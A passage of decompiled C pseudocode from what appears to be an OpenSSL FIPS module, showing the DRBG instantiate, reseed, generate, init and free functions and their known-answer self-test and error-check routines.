        v11 = v14;
        v12 = *(char *)v10;
        v9--;
        v13 = v11 + v7;
        v10 += v7;
        while (*(char *)v11 == v12) {
            if (v9 == 0) {
                // break (via goto) -> 0x43d4b9
                goto lab_0x43d4b9;
            }
            v11 = v13;
            v12 = *(char *)v10;
            v9--;
            v13 = v11 + v7;
            v10 += v7;
        }
    }
    // 0x43d4e8
    return v4 > a5 ? a5 : v4;
  lab_0x43d4b9:
    // 0x43d4b9
    ERR_put_error(45, 147, 142, "fips_drbg_lib.c", 170);
    // 0x43d4e8
    return 0;
}

// Address range: 0x43d520 - 0x43d731
int64_t FIPS_drbg_instantiate(int64_t a1, int64_t * a2, uint64_t a3) {
    int64_t v1 = 0; // bp-72, 0x43d558
    int64_t v2 = 129; // 0x43d567
    int64_t v3; // 0x43d520
    int32_t * v4; // 0x43d576
    if (*(int64_t *)(a1 + 72) < a3) {
        goto lab_0x43d590;
    } else {
        // 0x43d569
        v2 = 152;
        if (*(int64_t *)(a1 + 992) == 0) {
            goto lab_0x43d590;
        } else {
            // 0x43d576
            v4 = (int32_t *)(a1 + 104);
            int32_t v5 = *v4; // 0x43d576
            if (v5 == 0) {
                int64_t * v6 = (int64_t *)(a1 + 40); // 0x43d5f8
                int64_t * v7 = (int64_t *)(a1 + 48); // 0x43d604
                *v4 = 3;
                uint64_t v8 = fips_get_entropy(a1, &v1, *(int32_t *)(a1 + 20), *v6, *v7); // 0x43d60f
                v2 = 122;
                if (v8 < *v6) {
                    goto lab_0x43d590;
                } else {
                    // 0x43d61d
                    v2 = 122;
                    if (v8 > *v7) {
                        goto lab_0x43d590;
                    } else {
                        uint64_t v9 = *(int64_t *)(a1 + 64); // 0x43d690
                        v3 = v8;
                        if (v9 == 0) {
                            goto lab_0x43d6e3;
                        } else {
                            uint64_t v10 = *(int64_t *)(a1 + 1048); // 0x43d699
                            v2 = 127;
                            if (v10 == 0) {
                                goto lab_0x43d590;
                            } else {
                                // 0x43d6a5
                                v2 = 140;
                                v3 = v10;
                                if (v10 > v9 | v10 < *(int64_t *)(a1 + 56)) {
                                    goto lab_0x43d590;
                                } else {
                                    goto lab_0x43d6e3;
                                }
                            }
                        }
                    }
                }
            } else {
                // 0x43d57d
                v2 = v5 != 3 ? 134 : 123;
                goto lab_0x43d590;
            }
        }
    }
  lab_0x43d590:
    // 0x43d590
    if (*(int32_t *)(a1 + 104) == 1) {
        // 0x43d5a8
        return 1;
    }
    // 0x43d59b
    if (v2 == 0) {
        // 0x43d5a8
        return 0;
    }
    // 0x43d5a0
    if (*(char *)(a1 + 8) % 2 == 0) {
        // 0x43d5d0
        ERR_put_error(45, 138, v2, "fips_drbg_lib.c", 285);
    }
    // 0x43d5a8
    return 0;
  lab_0x43d6e3:
    // 0x43d6e3
    v2 = 127;
    if ((int32_t)v3 != 0) {
        // 0x43d711
        *v4 = 1;
        v2 = 0;
        if ((*(char *)(a1 + 8) & 2) == 0) {
            // 0x43d725
            *(int32_t *)(a1 + 88) = 1;
            v2 = 0;
        }
    }
    goto lab_0x43d590;
}

// Address range: 0x43d820 - 0x43d855
int64_t FIPS_drbg_uninstantiate(int64_t * a1) {
    int64_t v1 = (int64_t)a1;
    int64_t v2 = *(int64_t *)(v1 + 1016); // 0x43d821
    *(int32_t *)(v1 + 104) = 0;
    __asm_rep_stosq_memset((char *)(v1 + 120), 0, 108);
    return v2 == 0 ? 1 : v2 & 0xffffffff;
}

// Address range: 0x43d860 - 0x43da48
int64_t drbg_reseed(int64_t a1, int64_t a2, uint64_t a3, int64_t a4) {
    int32_t * v1 = (int32_t *)(a1 + 104); // 0x43d883
    int32_t v2 = *v1; // 0x43d883
    int64_t v3 = 0; // bp-48, 0x43d889
    int64_t v4; // 0x43d860
    int64_t v5; // 0x43d860
    int32_t v6; // 0x43d860
    if (v2 < 3) {
        if (a2 == 0) {
            goto lab_0x43d905;
        } else {
            // 0x43d8f9
            v6 = v2;
            v4 = 125;
            if (*(int64_t *)(a1 + 80) < a3) {
                goto lab_0x43d8b0;
            } else {
                goto lab_0x43d905;
            }
        }
    } else {
        // 0x43d89a
        v5 = 126;
        switch (v2) {
            case 3: {
                // 0x43d990
                if (*(char *)(a1 + 8) % 2 != 0) {
                    // 0x43d8cb
                    return 0;
                }
                // 0x43d9a0
                ERR_put_error(45, 162, 123, "fips_drbg_lib.c", 357);
                // 0x43d8cb
                return 0;
            }
            case 0: {
                goto lab_0x43d8bf;
            }
            default: {
                return 0;
            }
        }
    }
  lab_0x43d905:
    // 0x43d905
    *v1 = 3;
    int64_t v7; // 0x43d860
    if ((int32_t)a4 == 0) {
        goto lab_0x43d91a;
    } else {
        // 0x43d910
        if ((*(char *)(a1 + 4) & 2) == 0) {
            // 0x43da20
            v7 = 135;
            if ((int32_t)FIPS_drbg_health_check(a1, a2) == 0) {
                goto lab_0x43d94b;
            } else {
                goto lab_0x43d91a;
            }
        } else {
            goto lab_0x43d91a;
        }
    }
  lab_0x43d8bf:
    // 0x43d8bf
    if (*(char *)(a1 + 8) % 2 != 0) {
        // 0x43d8cb
        return 0;
    }
    // 0x43d9a0
    ERR_put_error(45, 162, v5 & 0xffffffff, "fips_drbg_lib.c", 357);
    // 0x43d8cb
    return 0;
  lab_0x43d91a:;
    int64_t * v8 = (int64_t *)(a1 + 40); // 0x43d91a
    int64_t * v9 = (int64_t *)(a1 + 48); // 0x43d926
    uint64_t v10 = fips_get_entropy(a1, &v3, *(int32_t *)(a1 + 20), *v8, *v9); // 0x43d92d
    v7 = 122;
    if (v10 >= *v8) {
        // 0x43d93b
        v7 = 122;
        if (v10 <= *v9) {
            // 0x43d9d0
            v7 = 0;
            if ((int32_t)v10 != 0) {
                char v11 = *(char *)(a1 + 8); // 0x43d9eb
                *v1 = 1;
                v7 = 0;
                if ((v11 & 2) == 0) {
                    // 0x43d9f8
                    *(int32_t *)(a1 + 88) = 1;
                    v7 = 0;
                }
            }
        }
    }
    goto lab_0x43d94b;
  lab_0x43d8b0:
    // 0x43d8b0
    if (v6 == 1) {
        // 0x43d8cb
        return 1;
    }
    // 0x43d8ba
    v5 = v4;
    if ((int32_t)v4 == 0) {
        // 0x43d8cb
        return 0;
    }
    goto lab_0x43d8bf;
  lab_0x43d94b:
    // 0x43d94b
    v6 = *v1;
    v4 = v7;
    goto lab_0x43d8b0;
}

// Address range: 0x43da50 - 0x43da5a
int64_t FIPS_drbg_reseed(int64_t a1, int32_t a2, int32_t a3, int64_t a4) {
    // 0x43da50
    return drbg_reseed(a1, (int64_t)a2, (int64_t)a3, 1);
}

// Address range: 0x43da60 - 0x43dca7
int64_t FIPS_drbg_generate(int64_t * a1, int64_t a2, uint64_t a3, int32_t a4, int64_t a5, uint64_t a6) {
    // 0x43da60
    if ((int32_t)FIPS_selftest_failed() != 0) {
        // 0x43db40
        ERR_put_error(45, 134, 101, "fips_drbg_lib.c", 392);
        // 0x43dad6
        return 0;
    }
    int64_t v1 = (int64_t)a1;
    if ((*(char *)(v1 + 4) & 2) == 0) {
        int32_t * v2 = (int32_t *)(v1 + 12); // 0x43db00
        uint32_t v3 = *v2 + 1; // 0x43db03
        *v2 = v3;
        if (v3 >= *(int32_t *)(v1 + 16)) {
            // 0x43db0e
            if ((int32_t)FIPS_drbg_health_check(v1, a2) == 0) {
                // 0x43db1a
                ERR_put_error(45, 146, 135, "fips_drbg_lib.c", 377);
                // 0x43dad6
                return 0;
            }
        }
    }
    int32_t * v4 = (int32_t *)(v1 + 104); // 0x43daa7
    uint32_t v5 = *v4; // 0x43daa7
    int64_t v6; // 0x43da60
    char * v7; // 0x43dbc1
    char v8; // 0x43da60
    if (v5 < 3) {
        // 0x43dba8
        if (*(int64_t *)(v1 + 32) < a3) {
            // 0x43dad6
            return 0;
        }
        // 0x43dbb2
        v6 = 125;
        if (*(int64_t *)(v1 + 80) < a6) {
            goto lab_0x43daca;
        } else {
            // 0x43dbc1
            v7 = (char *)(v1 + 8);
            v8 = *v7 & 2;
            if (v8 != 0) {
                // 0x43dc78
                goto lab_0x43dbdd;
            } else {
                // 0x43dbcb
                if (*(int32_t *)(v1 + 88) >= *(int32_t *)(v1 + 92)) {
                    // 0x43dc68
                    *v4 = 2;
                    goto lab_0x43dbe6;
                } else {
                    // 0x43dbd7
                    goto lab_0x43dbdd;
                }
            }
        }
    } else {
        // 0x43dab6
        v6 = 123;
        if (v5 != 3) {
            // 0x43dac0
            v6 = 126;
            if (v5 != 0) {
                // 0x43dad6
                return 1;
            }
        }
        goto lab_0x43daca;
    }
  lab_0x43daca:
    // 0x43daca
    if (*(char *)(v1 + 8) % 2 == 0) {
        // 0x43db80
        ERR_put_error(45, 134, v6, "fips_drbg_lib.c", 458);
    }
    // 0x43dad6
    return 0;
  lab_0x43dbdd:;
    int64_t v9 = (int64_t)v5 & 0xffffff00 | (int64_t)(v5 == 2);
    char v10; // 0x43da60
    if (a4 == 0 == (char)v9 == 0) {
        // 0x43dc0f
        v10 = v8;
        if ((int32_t)v9 != 0) {
            goto lab_0x43dc40;
        } else {
            // 0x43dc28
            *v4 = 3;
            v6 = 137;
            goto lab_0x43daca;
        }
    } else {
        goto lab_0x43dbe6;
    }
  lab_0x43dbe6:
    // 0x43dbe6
    v6 = 133;
    if ((int32_t)drbg_reseed(v1, a5, a6, (int64_t)(a4 == 0)) == 0) {
        goto lab_0x43daca;
    } else {
        // 0x43dbe6
        v10 = *v7 & 2;
        goto lab_0x43dc40;
    }
  lab_0x43dc40:
    // 0x43dc40
    if (v10 != 0) {
        // 0x43dad6
        return 1;
    }
    int32_t * v11 = (int32_t *)(v1 + 88); // 0x43dc4a
    uint32_t v12 = *v11; // 0x43dc4a
    if (v12 < *(int32_t *)(v1 + 92)) {
        // 0x43dc97
        *v11 = v12 + 1;
    } else {
        // 0x43dc52
        *v4 = 2;
    }
    // 0x43dad6
    return 1;
}

// Address range: 0x43dcb0 - 0x43dcf7
int64_t FIPS_drbg_free(int64_t a1) {
    // 0x43dcb0
    if (FIPS_get_default_drbg() == a1) {
        // 0x43dce8
        __asm_rep_stosq_memset((char *)a1, 0, 146);
        return 0;
    }
    // 0x43dccc
    OPENSSL_cleanse(a1 + 120, 864);
    return CRYPTO_free(a1, 864);
}

// Address range: 0x43dd00 - 0x43de02
int64_t FIPS_drbg_init(int64_t a1, int32_t a2, int32_t a3) {
    // 0x43dd00
    __asm_rep_stosq_memset((char *)a1, 0, 146);
    int64_t v1 = a1 + 4; // 0x43dd13
    *(int32_t *)v1 = a3;
    *(int32_t *)a1 = a2;
    *(int32_t *)(a1 + 16) = 0x1000000;
    int64_t v2 = fips_drbg_hash_init(a1); // 0x43dd22
    int64_t v3 = v2; // 0x43dd2c
    if ((int32_t)v2 == -2) {
        int64_t v4 = fips_drbg_ctr_init(a1); // 0x43dde3
        v3 = v4;
        if ((int32_t)v4 == -2) {
            // 0x43ddf3
            v3 = fips_drbg_hmac_init(a1);
        }
    }
    int32_t v5 = v3; // 0x43dd32
    int64_t v6 = a2; // 0x43dd34
    if (v5 < 1) {
        if (v5 == -2) {
            // 0x43ddb0
            ERR_put_error(45, 135, 139, "fips_drbg_lib.c", 85);
            v6 = 135;
        } else {
            // 0x43dd85
            ERR_put_error(45, 135, 115, "fips_drbg_lib.c", 87);
            v6 = 135;
        }
    }
    // 0x43dd36
    if ((*(char *)v1 & 2) != 0 || (int32_t)FIPS_drbg_health_check(a1, v6) != 0) {
        // 0x43dd3c
        return v3 & 0xffffffff;
    }
    // 0x43dd54
    ERR_put_error(45, 135, 135, "fips_drbg_lib.c", 96);
    return 0;
}

// Address range: 0x43de10 - 0x43deb6
int64_t FIPS_drbg_new(uint32_t a1, int32_t a2) {
    // 0x43de10
    int64_t v1; // 0x43de10
    int64_t v2; // 0x43de10
    int64_t result = CRYPTO_malloc(1168, "fips_drbg_lib.c", 107, v2, v1); // 0x43de39
    if (result == 0) {
        // 0x43de93
        ERR_put_error(45, 139, 65, "fips_drbg_lib.c", 110);
        // 0x43de5b
        return 0;
    }
    if (a1 == 0) {
        // 0x43de78
        __asm_rep_stosq_memset((char *)result, 0, 146);
        // 0x43de5b
        return result;
    }
    int64_t v3 = FIPS_drbg_init(result, a1, a2); // 0x43de52
    int64_t result2 = result; // 0x43de59
    if ((int32_t)v3 < 1) {
        // 0x43de87
        CRYPTO_free(result, (int64_t)a1);
        result2 = 0;
    }
    // 0x43de5b
    return result2;
}

// Address range: 0x43dec0 - 0x43dec8
int64_t FIPS_get_default_drbg(void) {
    // 0x43dec0
    return &g249;
}

// Address range: 0x43ded0 - 0x43ded8
int64_t FIPS_drbg_method(void) {
    // 0x43ded0
    return &g81;
}

// Address range: 0x43e190 - 0x43e238
int64_t do_drbg_init(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int32_t v1 = *(int32_t *)(a2 + 4); // 0x43e1ac
    if ((int32_t)FIPS_drbg_init(a1, v1, *(int32_t *)(a2 + 8)) == 0) {
        // 0x43e1bd
        return 0;
    }
    int64_t result = 0; // 0x43e1ef
    if ((int32_t)FIPS_drbg_set_callbacks(a1, 0x43f0b0, 0, 0, 0x43f090, 0) != 0) {
        // 0x43e1f1
        FIPS_drbg_set_app_data(a1, a3);
        *(int32_t *)(a3 + 16) = 0;
        *(int32_t *)(a3 + 40) = 0;
        *(int64_t *)a3 = *(int64_t *)(a2 + 16);
        *(int64_t *)(a3 + 8) = *(int64_t *)(a2 + 24);
        *(int64_t *)(a3 + 24) = *(int64_t *)(a2 + 32);
        *(int64_t *)(a3 + 32) = *(int64_t *)(a2 + 40);
        result = 1;
    }
    // 0x43e1bd
    return result;
}

// Address range: 0x43e240 - 0x43e288
int64_t do_drbg_instantiate(int64_t a1, int64_t a2) {
    int64_t result = 0; // 0x43e25f
    int64_t v1; // 0x43e240
    int64_t v2; // 0x43e240
    int64_t v3; // 0x43e240
    int64_t v4; // 0x43e240
    if ((int32_t)do_drbg_init(a1, a2, v3, v4, v2, v1) != 0) {
        int64_t v5 = *(int64_t *)(a2 + 56); // 0x43e261
        int64_t v6 = *(int64_t *)(a2 + 48); // 0x43e265
        result = (int32_t)FIPS_drbg_instantiate(a1, (int64_t *)v6, v5) != 0;
    }
    // 0x43e279
    return result;
}

// Address range: 0x43e290 - 0x43e698
int64_t fips_drbg_single_kat(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int32_t * v1 = (int32_t *)(a2 + 8);
    int32_t * v2 = (int32_t *)(a2 + 4);
    int64_t v3 = __readfsqword(40); // 0x43e2bf
    int64_t * v4; // 0x43e290
    int64_t * v5; // 0x43e290
    int32_t * v6; // 0x43e290
    int32_t * v7; // 0x43e290
    int64_t * v8; // 0x43e290
    int64_t v9; // 0x43e290
    int64_t v10; // 0x43e290
    int64_t v11; // 0x43e290
    int64_t str; // bp-1080, 0x43e290
    int64_t v12; // bp-1128, 0x43e290
    if ((int32_t)FIPS_drbg_init(a1, *v2, *v1) != 0) {
        // 0x43e330
        if ((int32_t)FIPS_drbg_set_callbacks(a1, 0x43f0b0, 0, 0, 0x43f090, 0) == 0) {
            // 0x43e2db
            v9 = 0;
            goto lab_0x43e2dd;
        } else {
            // 0x43e351
            FIPS_drbg_set_app_data(a1, (int64_t)&v12);
            v12 = *(int64_t *)(a2 + 16);
            int64_t v13 = *(int64_t *)(a2 + 48); // 0x43e38d
            int64_t v14 = *(int64_t *)(a2 + 56); // 0x43e396
            if ((int32_t)FIPS_drbg_instantiate(a1, (int64_t *)v13, v14) != 0) {
                int64_t * v15 = (int64_t *)(a2 + 136); // 0x43e3d8
                int64_t v16 = *(int64_t *)(a2 + 64); // 0x43e3e8
                int64_t v17 = &str; // 0x43e3f1
                int64_t * v18 = (int64_t *)a1;
                int64_t v19 = FIPS_drbg_generate(v18, v17, *v15, 0, v16, *(int64_t *)(a2 + 72)); // 0x43e3f4
                v4 = v18;
                if ((int32_t)v19 == 0) {
                    goto lab_0x43e3a3;
                } else {
                    // 0x43e3fd
                    bool v20; // 0x43e290
                    int64_t v21 = v20 ? -1 : 1;
                    int64_t v22 = *v15; // 0x43e411
                    int64_t v23 = v17; // 0x43e411
                    int64_t v24 = *(int64_t *)(a2 + 128); // 0x43e411
                    while (v22 != 0) {
                        int64_t v25 = v23;
                        char v26 = *(char *)v24; // 0x43e411
                        v22--;
                        v23 = v25 + v21;
                        v24 += v21;
                        if (*(char *)v25 != v26) {
                            // 0x43e421
                            ERR_put_error(45, 141, 145, "fips_drbg_selftest.c", 232);
                            v5 = v18;
                            v10 = 0;
                            goto lab_0x43e3c6;
                        }
                    }
                    // 0x43e415
                    v5 = v18;
                    v10 = 1;
                    if ((int32_t)a3 == 0) {
                        // 0x43e446
                        v12 = *(int64_t *)(a2 + 80);
                        int64_t v27 = *(int64_t *)(a2 + 96); // 0x43e455
                        int64_t v28 = *(int64_t *)(a2 + 104); // 0x43e45e
                        v4 = v18;
                        if ((int32_t)FIPS_drbg_reseed(a1, (int32_t)v27, (int32_t)v28, 0) == 0) {
                            goto lab_0x43e3a3;
                        } else {
                            int64_t * n = (int64_t *)(a2 + 152); // 0x43e46f
                            int64_t v29 = *(int64_t *)(a2 + 112); // 0x43e47c
                            int64_t v30 = FIPS_drbg_generate(v18, v17, *n, 0, v29, *(int64_t *)(a2 + 120)); // 0x43e486
                            v4 = v18;
                            if ((int32_t)v30 == 0) {
                                goto lab_0x43e3a3;
                            } else {
                                int64_t str2 = *(int64_t *)(a2 + 144); // 0x43e493
                                int32_t memcmp_rc = memcmp(&str, (int64_t *)str2, (int32_t)*n); // 0x43e4a4
                                v7 = v2;
                                v6 = v1;
                                v8 = v18;
                                v11 = a2;
                                if (memcmp_rc == 0) {
                                    goto lab_0x43e4da;
                                } else {
                                    // 0x43e4ad
                                    ERR_put_error(45, 141, 146, "fips_drbg_selftest.c", 255);
                                    v5 = v18;
                                    v10 = 0;
                                    goto lab_0x43e3c6;
                                }
                            }
                        }
                    } else {
                        goto lab_0x43e3c6;
                    }
                }
            } else {
                // 0x43e351
                v4 = (int64_t *)a1;
                goto lab_0x43e3a3;
            }
        }
    } else {
        // 0x43e2db
        v9 = 0;
        goto lab_0x43e2dd;
    }
  lab_0x43e2dd:;
    int64_t v31 = v9;
    if (v3 == __readfsqword(40)) {
        // 0x43e2f6
        return v31 & 0xffffffff;
    }
    // 0x43e4d5
    __stack_chk_fail();
    v7 = (int32_t *)(v31 + 4);
    v6 = (int32_t *)(v31 + 8);
    v8 = (int64_t *)a1;
    v11 = v31;
    goto lab_0x43e4da;
  lab_0x43e4da:;
    int64_t * v32 = v8;
    FIPS_drbg_uninstantiate(v32);
    if ((int32_t)FIPS_drbg_init(a1, *v7, *v6) == 0) {
        // 0x43e2db
        v9 = 0;
        goto lab_0x43e2dd;
    } else {
        // 0x43e4fb
        if ((int32_t)FIPS_drbg_set_callbacks(a1, 0x43f0b0, 0, 0, 0x43f090, 0) == 0) {
            // 0x43e2db
            v9 = 0;
            goto lab_0x43e2dd;
        } else {
            int64_t v33 = v11;
            FIPS_drbg_set_app_data(a1, (int64_t)&v12);
            v12 = *(int64_t *)(v33 + 160);
            int64_t v34 = *(int64_t *)(v33 + 192); // 0x43e568
            int64_t v35 = *(int64_t *)(v33 + 200); // 0x43e574
            v4 = v32;
            if ((int32_t)FIPS_drbg_instantiate(a1, (int64_t *)v34, v35) == 0) {
                goto lab_0x43e3a3;
            } else {
                int64_t v36 = &str; // 0x43e594
                v12 = *(int64_t *)(v33 + 224);
                int64_t * n2 = (int64_t *)(v33 + 280); // 0x43e5b1
                int64_t v37 = *n2; // 0x43e5b1
                int64_t v38 = *(int64_t *)(v33 + 216); // 0x43e5b8
                int64_t v39 = FIPS_drbg_generate(v32, v36, v37, 1, *(int64_t *)(v33 + 208), v38); // 0x43e5bf
                v4 = v32;
                if ((int32_t)v39 == 0) {
                    goto lab_0x43e3a3;
                } else {
                    int64_t str3 = *(int64_t *)(v33 + 272); // 0x43e5cc
                    if (memcmp(&str, (int64_t *)str3, (int32_t)*n2) == 0) {
                        // 0x43e60e
                        v12 = *(int64_t *)(v33 + 256);
                        int64_t * n3 = (int64_t *)(v33 + 296); // 0x43e637
                        int64_t v40 = *n3; // 0x43e637
                        int64_t v41 = *(int64_t *)(v33 + 248); // 0x43e63e
                        int64_t v42 = FIPS_drbg_generate(v32, v36, v40, 1, *(int64_t *)(v33 + 240), v41); // 0x43e645
                        v4 = v32;
                        if ((int32_t)v42 == 0) {
                            goto lab_0x43e3a3;
                        } else {
                            int64_t str4 = *(int64_t *)(v33 + 288); // 0x43e652
                            int32_t memcmp_rc2 = memcmp(&str, (int64_t *)str4, (int32_t)*n3); // 0x43e663
                            v5 = v32;
                            v10 = 1;
                            if (memcmp_rc2 != 0) {
                                // 0x43e670
                                ERR_put_error(45, 141, 148, "fips_drbg_selftest.c", 321);
                                v5 = v32;
                                v10 = 0;
                            }
                            goto lab_0x43e3c6;
                        }
                    } else {
                        // 0x43e5e6
                        ERR_put_error(45, 141, 147, "fips_drbg_selftest.c", 304);
                        v5 = v32;
                        v10 = 0;
                        goto lab_0x43e3c6;
                    }
                }
            }
        }
    }
  lab_0x43e3a3:
    // 0x43e3a3
    ERR_put_error(45, 141, 101, "fips_drbg_selftest.c", 329);
    v5 = v4;
    v10 = 0;
    goto lab_0x43e3c6;
  lab_0x43e3c6:
    // 0x43e3c6
    FIPS_drbg_uninstantiate(v5);
    v9 = v10;
    goto lab_0x43e2dd;
}

// Address range: 0x43e6a0 - 0x43e735
int64_t FIPS_selftest_drbg(int64_t a1, int64_t a2) {
    int64_t v1 = FIPS_drbg_new(0, 0); // 0x43e6b0
    if (v1 == 0) {
        // 0x43e728
        return 0;
    }
    // 0x43e6bd
    if (g177 == 0) {
        // 0x43e720
        FIPS_drbg_free(v1);
        // 0x43e728
        return 1;
    }
    int64_t v2 = 1;
    int64_t v3 = (int64_t)&g176;
    int64_t v4; // 0x43e6a0
    while (*(int32_t *)v3 != 1) {
        // 0x43e6e0
        v4 = v2;
        if (*(int32_t *)(v3 + 308) == 0) {
            // break (via goto) -> 0x43e720
            goto lab_0x43e720;
        }
        v3 += 304;
    }
    // 0x43e6f3
    int64_t v5; // 0x43e6a0
    int64_t v6; // 0x43e6a0
    int64_t v7; // 0x43e6a0
    int64_t v8 = (int32_t)fips_drbg_single_kat(v1, v3, 1, v7, v6, v5) == 0 ? 0 : v2;
    v4 = v8;
    while (*(int32_t *)(v3 + 308) != 0) {
        // 0x43e6ee
        v2 = v8;
        v3 += 304;
        while (*(int32_t *)v3 != 1) {
            // 0x43e6e0
            v4 = v2;
            if (*(int32_t *)(v3 + 308) == 0) {
                // break (via goto) -> 0x43e720
                goto lab_0x43e720;
            }
            v3 += 304;
        }
        // 0x43e6f3
        v8 = (int32_t)fips_drbg_single_kat(v1, v3, 1, v7, v6, v5) == 0 ? 0 : v2;
        v4 = v8;
    }
  lab_0x43e720:
    // 0x43e720
    FIPS_drbg_free(v1);
    // 0x43e728
    return v4 & 0xffffffff;
}

// Address range: 0x43e740 - 0x43ef12
int64_t fips_drbg_error_check(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    // 0x43e740
    int64_t v1; // bp-1128, 0x43e740
    int64_t v2 = &v1; // 0x43e766
    int64_t v3 = __readfsqword(40); // 0x43e769
    int64_t v4; // 0x43e740
    int64_t v5; // 0x43e740
    int64_t v6 = do_drbg_init(a1, a2, v2, a4, v5, v4); // 0x43e77c
    int64_t v7 = a4; // 0x43e783
    int32_t * v8; // 0x43e740
    int64_t * v9; // 0x43e740
    int64_t v10; // 0x43e740
    int64_t v11; // 0x43e740
    int64_t v12; // 0x43e740
    int64_t v13; // 0x43e740
    int64_t v14; // 0x43e740
    int64_t v15; // 0x43e740
    int64_t v16; // 0x43e740
    int64_t v17; // 0x43e740
    int64_t v18; // bp-1080, 0x43e740
    if ((int32_t)v6 != 0) {
        int64_t v19 = a1 + 8;
        int32_t * v20 = (int32_t *)v19;
        *v20 = *v20 | 1;
        int64_t v21 = *(int64_t *)(a1 + 72); // 0x43e7e4
        int64_t * v22 = (int64_t *)(a2 + 48); // 0x43e7eb
        if ((int32_t)FIPS_drbg_instantiate(a1, (int64_t *)*v22, v21 + 1) < 1) {
            int64_t * v23 = (int64_t *)(a2 + 56); // 0x43e860
            v10 = 411;
            if ((int32_t)FIPS_drbg_instantiate(a1, (int64_t *)*v22, *v23) < 1) {
                int64_t v24 = *(int64_t *)(a2 + 136); // 0x43e898
                int64_t v25 = *(int64_t *)(a2 + 72); // 0x43e8a4
                int64_t v26 = *(int64_t *)(a2 + 64); // 0x43e8a8
                int64_t * v27 = (int64_t *)a1;
                int64_t v28 = FIPS_drbg_generate(v27, (int64_t)&v18, v24, 0, v26, v25); // 0x43e8b4
                if ((int32_t)v28 == 0) {
                    // 0x43e8e3
                    *v20 = *v20 & -2;
                    v11 = 426;
                    v14 = v25;
                    if ((int32_t)FIPS_drbg_uninstantiate(v27) == 0) {
                        goto lab_0x43e945;
                    } else {
                        int64_t v29 = do_drbg_init(a1, a2, v2, 0, 426, v25); // 0x43e902
                        v7 = 0;
                        v12 = v25;
                        if ((int32_t)v29 == 0) {
                            goto lab_0x43e785;
                        } else {
                            // 0x43e90f
                            *v20 = *v20 | 1;
                            v10 = 441;
                            v13 = v25;
                            v9 = v27;
                            v8 = v20;
                            v17 = 0;
                            v15 = v25;
                            if ((int32_t)FIPS_drbg_instantiate(a1, (int64_t *)*v22, *v23) < 1) {
                                goto lab_0x43e96a;
                            } else {
                                goto lab_0x43e873;
                            }
                        }
                    }
                } else {
                    // 0x43e8bd
                    ERR_put_error(45, 136, 118, "fips_drbg_selftest.c", 419);
                    v7 = (int64_t)"fips_drbg_selftest.c";
                    v12 = v25;
                    goto lab_0x43e785;
                }
            } else {
                goto lab_0x43e873;
            }
        } else {
            // 0x43e7fc
            ERR_put_error(45, 136, 128, "fips_drbg_selftest.c", 399);
            v16 = (int64_t)"fips_drbg_selftest.c";
            if (*(char *)v19 % 2 != 0) {
                goto lab_0x43e78f;
            } else {
                goto lab_0x43e827;
            }
        }
    } else {
        goto lab_0x43e785;
    }
  lab_0x43e785:
    // 0x43e785
    v16 = v7;
    int64_t v30 = v12; // 0x43e789
    int64_t v31 = v12; // 0x43e789
    if (*(char *)(a1 + 8) % 2 == 0) {
        goto lab_0x43e827;
    } else {
        goto lab_0x43e78f;
    }
  lab_0x43e827:
    // 0x43e827
    ERR_put_error(45, 136, 116, "fips_drbg_selftest.c", 760);
    v16 = (int64_t)"fips_drbg_selftest.c";
    v30 = v31;
    goto lab_0x43e78f;
  lab_0x43e78f:;
    int64_t * v32 = (int64_t *)a1;
    FIPS_drbg_uninstantiate(v32);
    if (v3 == __readfsqword(40)) {
        // 0x43e7b0
        return 0;
    }
    // 0x43e965
    __stack_chk_fail();
    v9 = v32;
    v8 = (int32_t *)(a1 + 8);
    v17 = v16;
    v15 = v30;
    goto lab_0x43e96a;
  lab_0x43e873:
    // 0x43e873
    ERR_put_error(45, 136, 104, "fips_drbg_selftest.c", v10);
    v7 = (int64_t)"fips_drbg_selftest.c";
    v12 = v13;
    goto lab_0x43e785;
  lab_0x43e96a:;
    int64_t v33 = v15;
    int32_t * v34 = v8;
    int64_t * v35 = v9;
    *v34 = *v34 & -2;
    v11 = 448;
    v14 = v33;
    int64_t v36; // 0x43e740
    int64_t v37; // 0x43e740
    int64_t v38; // 0x43e740
    int64_t * v39; // 0x43e9a1
    int64_t * v40; // 0x43e9ae
    if ((int32_t)FIPS_drbg_uninstantiate(v35) == 0) {
        goto lab_0x43e945;
    } else {
        // 0x43e980
        v38 = v17;
        if ((int32_t)do_drbg_init(a1, a2, v2, v38, 448, v33) == 0) {
            goto lab_0x43e785;
        } else {
            // 0x43e996
            *v34 = *v34 | 1;
            v39 = (int64_t *)(a2 + 48);
            v40 = (int64_t *)(a2 + 56);
            int32_t v41 = FIPS_drbg_instantiate(a1, (int64_t *)*v39, *v40); // 0x43e9b7
            v10 = 463;
            v13 = v33;
            if (v41 >= 0 == (v41 != 0)) {
                goto lab_0x43e873;
            } else {
                // 0x43e9c5
                *v34 = *v34 & -2;
                v11 = 470;
                v14 = v33;
                if ((int32_t)FIPS_drbg_uninstantiate(v35) == 0) {
                    goto lab_0x43e945;
                } else {
                    // 0x43e9df
                    v36 = 470;
                    if (*(int64_t *)(a1 + 56) != 0) {
                        int64_t v42 = do_drbg_init(a1, a2, v2, v38, 470, v33); // 0x43ea5f
                        v7 = v38;
                        v12 = v33;
                        if ((int32_t)v42 == 0) {
                            goto lab_0x43e785;
                        } else {
                            // 0x43ea6c
                            *v34 = *v34 | 1;
                            int32_t v43 = FIPS_drbg_instantiate(a1, (int64_t *)*v39, *v40); // 0x43ea8d
                            v37 = 490;
                            if (v43 >= 0 == (v43 != 0)) {
                                goto lab_0x43ea36;
                            } else {
                                // 0x43ea97
                                *v34 = *v34 & -2;
                                v11 = 497;
                                v14 = v33;
                                v36 = 497;
                                if ((int32_t)FIPS_drbg_uninstantiate(v35) != 0) {
                                    goto lab_0x43e9e6;
                                } else {
                                    goto lab_0x43e945;
                                }
                            }
                        }
                    } else {
                        goto lab_0x43e9e6;
                    }
                }
            }
        }
    }
  lab_0x43e945:
    // 0x43e945
    ERR_put_error(45, 136, 141, "fips_drbg_selftest.c", v11);
    v7 = (int64_t)"fips_drbg_selftest.c";
    v12 = v14;
    goto lab_0x43e785;
  lab_0x43e9e6:
    // 0x43e9e6
    if (*(int64_t *)(a1 + 64) == 0) {
        goto lab_0x43ead0;
    } else {
        int64_t v44 = do_drbg_init(a1, a2, v2, v38, v36, v33); // 0x43e9fa
        v7 = v38;
        v12 = v33;
        if ((int32_t)v44 == 0) {
